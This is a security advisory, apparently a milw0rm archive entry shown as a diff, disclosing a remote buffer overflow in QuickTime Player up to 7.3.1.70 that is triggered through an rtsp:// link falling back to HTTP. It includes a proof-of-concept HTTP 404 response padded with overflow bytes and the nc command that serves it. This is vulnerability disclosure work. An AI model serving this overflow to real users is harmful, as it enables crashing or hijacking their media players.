@@ -1,0 +1,90 @@
+#######################################################################
+
+                             Luigi Auriemma
+
+Application:  Quicktime Player
+              http://www.apple.com/quicktime
+Versions:     <= 7.3.1.70
+Platforms:    Windows and Mac
+Bug:          buffer-overflow
+Exploitation: remote
+Date:         10 Jan 2008
+Thanx to:     swirl for the help during the re-testing of the bug
+Author:       Luigi Auriemma
+              e-mail: aluigi@autistici.org
+              web:    aluigi.org
+
+
+#######################################################################
+
+
+1) Introduction
+2) Bug
+3) The Code
+4) Fix
+
+
+#######################################################################
+
+===============
+1) Introduction
+===============
+
+
+Quicktime is a well known media player developed by Apple.
+
+
+#######################################################################
+
+======
+2) Bug
+======
+
+
+The problem is a buffer-overflow which happens during the filling of
+the LCD-like screen containing info about the status of the connection.
+
+For exploiting this vulnerability is only needed that an user follows
+a rtsp:// link, if the port 554 of the server is closed Quicktime will
+automatically change the transport and will try the HTTP protocol on
+port 80, the 404 error message of the server (other error numbers are
+valid too) will be visualized in the LCD-like screen.
+
+During my tests I have been able to fully overwrite the return address
+anyway note that the visible effects of the vulnerability could change
+during the usage of the debugger (in attaching mode it's everything
+ok).
+
+
+#######################################################################
+
+===========
+3) The Code
+===========
+
+
+http://aluigi.org/poc/quicktimebof.txt
+
+quicktimebof.txt
+HTTP/1.1 404 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxy
+
+  nc -l -p 80 -v -v -n < quicktimebof.txt
+
+and then
+
+  QuickTimePlayer.exe rtsp://127.0.0.1/file.mp3
+
+
+#######################################################################
+
+======
+4) Fix
+======
+
+
+No fix
+
+
+#######################################################################
+
+# milw0rm.com [2008-01-10]
